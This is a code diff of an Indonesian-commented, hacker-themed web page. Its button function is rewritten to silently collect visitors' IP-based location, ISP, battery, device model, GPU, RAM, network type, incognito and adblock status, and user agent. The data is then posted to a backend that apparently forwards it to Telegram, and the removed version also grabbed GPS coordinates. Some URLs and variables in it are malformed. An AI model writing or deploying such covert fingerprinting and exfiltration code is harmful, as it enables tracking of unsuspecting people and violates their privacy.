@@ -441,7 +441,7 @@
                     </div>
                     <div class="trigger-zone">
                         <!-- Kita bisa set data bawaan yang mau dikirim di sini -->
-                        <input type="hidden" id="payloadName" value="Target-Alpha">
+                        <input type="hidden" id="payloadName" value="Target:">
                         <input type="hidden" id="payloadMessage" value="Payload injected successfully via Terminal.">
                         
                         <button class="exploit-btn" onclick="kirimKeTelegram()">[ INJECT_PAYLOAD ]</button>
@@ -522,81 +522,112 @@
             document.getElementById('customAlert').style.display = 'none';
             document.querySelectorAll('.malware-popup').forEach(el => el.remove());
         }       
-     async function kirimKeTelegram() {
-    // Ambil data dari elemen HTML
-    const namaData = document.getElementById('payloadName').value;
-    const pesanData = document.getElementById('payloadMessage').value;
-
+  async function kirimKeTelegram() {
     try {
-        // Panggil API internal Vercel kamu
-        const response = await fetch('/api/kirim.mjs', {
+        // 1. Ambil data Geolokasi & IP Target
+        const geoResponse = await fetch('https://ipapi.co');
+        const geoData = await geoResponse.json();
+
+        // 2. Ambil Persentase Baterai & Status Charging
+        let batteryInfo = "Tidak Didukung Browser";
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            const level = Math.round(battery.level * 100);
+            const charging = battery.charging ? "🔌 Sedang Dicas" : "🔋 Menggunakan Baterai";
+            batteryInfo = `${level}% (${charging})`;
+        }
+
+        // 3. Deteksi Merk HP / Model Perangkat
+        let deviceModel = "Desktop / Perangkat Tidak Diketahui";
+        const userAgent = navigator.userAgent;
+        if (navigator.userAgentData && navigator.userAgentData.mobile) {
+            const brands = navigator.userAgentData.brands.map(b => b.brand).join(', ');
+            deviceModel = `Mobile (${brands})`;
+        } else {
+            if (/iPhone|iPad|iPod/i.test(userAgent)) deviceModel = "Apple iPhone / iPad";
+            else if (/Samsung|SM-/i.test(userAgent)) deviceModel = "Samsung Galaxy";
+            else if (/Xiaomi|Redmi|POCO/i.test(userAgent)) deviceModel = "Xiaomi / Redmi";
+            else if (/Oppo|CPH/i.test(userAgent)) deviceModel = "OPPO Phone";
+            else if (/Vivo|V20/i.test(userAgent)) deviceModel = "Vivo Phone";
+            else if (/Realme|RMX/i.test(userAgent)) deviceModel = "Realme Phone";
+            else if (/Android/i.test(userAgent)) deviceModel = "Android Device (Merk Umum)";
+        }
+
+        // 4. Deteksi Tipe Koneksi Jaringan
+        let networkType = "Tidak Diketahui / Desktop";
+        if (navigator.connection) {
+            networkType = `${navigator.connection.effectiveType || 'Unknown'} (${navigator.connection.type || 'cellular/wifi'})`;
+        }
+
+        // 5. Deteksi Spesifikasi GPU / Kartu Grafis
+        let gpuInfo = "Tidak Diketahui";
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch (e) { gpuInfo = "Gagal Membaca GPU"; }
+
+        // 6. Deteksi Pengecekan Keamanan & Penyimpanan
+        let adBlockActive = "❌ Tidak Aktif / Tidak Terdeteksi";
+        try {
+            await fetch('https://googlesyndication.com', { method: 'HEAD', mode: 'no-cors' });
+        } catch (e) { adBlockActive = "🛡️ Aktif (Google Ads Diblokir)"; }
+
+        let incognitoHint = "Biasa (Normal Mode)";
+        try {
+            if (navigator.storage && navigator.storage.estimate) {
+                const estimate = await navigator.storage.estimate();
+                if (estimate.quota < 120000000) incognitoHint = "🕵️‍♂️ Terdeteksi Kemungkinan Incognito Mode";
+            }
+        } catch (e) {}
+
+        // 7. Susun Payload Paling Lengkap (God-Mode)
+        const payloadData = {
+            nama: "☣️ GOD_MODE_SYSTEM_EXPLOIT",
+            pesan: `
+📱 *SPESIFIKASI PERANGKAT & HARDWARE*
+├─ 🛡️ *Merk/Model:* ${deviceModel}
+├─ ⚡ *Status Baterai:* ${batteryInfo}
+├─ 💾 *Kapasitas RAM:* ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Hidden / iOS'}
+├─ 🎛️ *Inti CPU (Cores):* ${navigator.hardwareConcurrency || 'Unknown'} Core
+├─ 🎮 *Kartu Grafis (GPU):* \`${gpuInfo}\`
+├─ 👆 *Layar Sentuh (Touch):* ${navigator.maxTouchPoints > 0 ? '✅ Ya' : '❌ Tidak'}
+└─ 🎚️ *Dimensi Layar:* ${window.screen.width}x${window.screen.height} px (${window.devicePixelRatio}x)
+
+🌐 *JARINGAN & GEO-TRACKING*
+├─ 🌐 *IP Address Target:* ${geoData.ip || 'Unknown'}
+├─ 📶 *Tipe Koneksi:* ${networkType}
+├─ 🏢 *ISP / Provider:* ${geoData.org || 'Unknown'}
+├─ 🌍 *Lokasi Terbaca:* ${geoData.city || 'Unknown'}, ${geoData.country_name || 'Unknown'}
+└─ 🗺️ *G-Maps:* \`https://google.com{geoData.latitude},${geoData.longitude}\`
+
+💻 *SISTEM SOFTWARE & PRIVASI*
+├─ 🕵️‍♂️ *Status Penyamaran:* ${incognitoHint}
+├─ 🛡️ *Penggunaan AdBlocker:* ${adBlockActive}
+├─ 🍪 *Cookie Aktif:* ${navigator.cookieEnabled ? '✅ Ya' : '❌ Tidak'}
+├─ 📐 *Orientasi Layar:* ${screen.orientation ? screen.orientation.type : 'Unknown'}
+├─ 🗣️ *Bahasa Perangkat:* ${navigator.language || 'Unknown'}
+├─ 🕰️ *Zona Waktu:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+└─ 📄 *User Agent:* \`${userAgent}\`
+            `.trim()
+        };
+
+        // 8. Kirim data ke backend Vercel secara silent
+        await fetch('/api/kirim.mjs', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json' // PENTING: Beritahu server kalau ini JSON
-            },
-            body: JSON.stringify({
-                nama: namaData,
-                pesan: pesanData
-            })
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payloadData)
         });
 
-        const hasil = await response.json();
-
-        if (response.ok) {
-            alert('Payload Berhasil Di-inject!');
-            console.log('Sukses:', hasil);
-        } else {
-            alert('Gagal menginject: ' + hasil.error);
-            console.error('Gagal:', hasil);
-        }
+        console.log('God-mode payload successfully deployed.');
     } catch (error) {
-        alert('Terjadi kesalahan jaringan.');
-        console.error('Error Jaringan:', error);
+        console.error('Execution Failed:', error);
     }
-
-
-    // 2. Mengambil data GPS (Wajib memunculkan pop-up izin browser)
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            // JIKA TARGET MENGKLIK "ALLOW" (IZINKAN)
-            (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const mapsUrl = `https://google.com/maps?q=${lat},${lon}`;
-                
-                // Jalankan pengiriman data lengkap ke Vercel Backend
-                sendToBackend(dataBrowser, waktuAkses, infoBaterai, mapsUrl);
-            },
-            (error) => {
-                const mapsUrl = "fuckyou";
-                sendToBackend(dataBrowser, waktuAkses, infoBaterai, mapsUrl);
-            }
-        );
-    } else {
-        const mapsUrl = "Fitur GPS tidak didukung browser";
-        sendToBackend(dataBrowser, waktuAkses, infoBaterai, mapsUrl);
-    }
-}
-
-// Fungsi baru untuk membungkus pengiriman data ke server Vercel Anda
-function sendToBackend(device, waktu, baterai, gps) {
-    fetch('/api/kirim.mjs', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ device, waktu, baterai, gps })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.status === 'success') {
-            showAlert(); // Pemicu pop-up "> you found me"
-        } else {
-            alert("Error: Gagal mengirim via server backend.");
-        }
-    })
-    .catch(err => {
-        console.error("Error jaringan:", err);
-        alert("Terjadi kesalahan jaringan.");
-    });
 }
         
     </script>
